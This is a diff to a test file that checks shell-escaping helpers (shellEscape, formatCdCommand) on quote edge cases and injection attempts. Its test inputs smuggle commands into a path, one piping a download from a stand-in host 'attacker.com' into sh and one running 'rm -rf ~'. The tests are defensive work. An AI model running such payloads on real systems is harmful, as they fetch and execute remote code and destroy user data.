@@ -14,8 +14,20 @@ describe("shellEscape", () => {
     expect(shellEscape("a'b'c")).toBe("a'\\''b'\\''c");
   });
 
+  it("escapes a single quote at the start", () => {
+    expect(shellEscape("'start")).toBe("'\\''start");
+  });
+
+  it("escapes a single quote at the end", () => {
+    expect(shellEscape("end'")).toBe("end'\\''");
+  });
+
   it("handles empty string", () => {
     expect(shellEscape("")).toBe("");
+  });
+
+  it("handles string that is only a single quote", () => {
+    expect(shellEscape("'")).toBe("'\\''");
   });
 
   it("does not escape double quotes", () => {
@@ -47,15 +59,23 @@ describe("formatCdCommand", () => {
     expect(result).toBe("cd '/tmp/`whoami`/$USER/repo'");
   });
 
-  it("prevents shell injection", () => {
+  it("handles path with shell injection attempt", () => {
+    const maliciousPath = "/tmp/x'; curl attacker.com/steal | sh; echo '";
+    const result = formatCdCommand(maliciousPath);
+    expect(result).toBe("cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''");
+  });
+
+  it("prevents shell injection with rm payload", () => {
     const malicious = "/tmp/repo'; rm -rf ~; echo '";
     const result = formatCdCommand(malicious);
-    // Each ' in the input becomes '\'' in the escaped output
-    // The result contains the escaped path as a safe cd command
     expect(result).toContain("cd '");
     expect(result).toContain("'\\''");
     // Verify both quotes were escaped (input has 2 single quotes)
     const escapeCount = result.split("'\\''").length - 1;
     expect(escapeCount).toBe(2);
+  });
+
+  it("handles path with spaces", () => {
+    expect(formatCdCommand("/tmp/my repo/path")).toBe("cd '/tmp/my repo/path'");
   });
 });
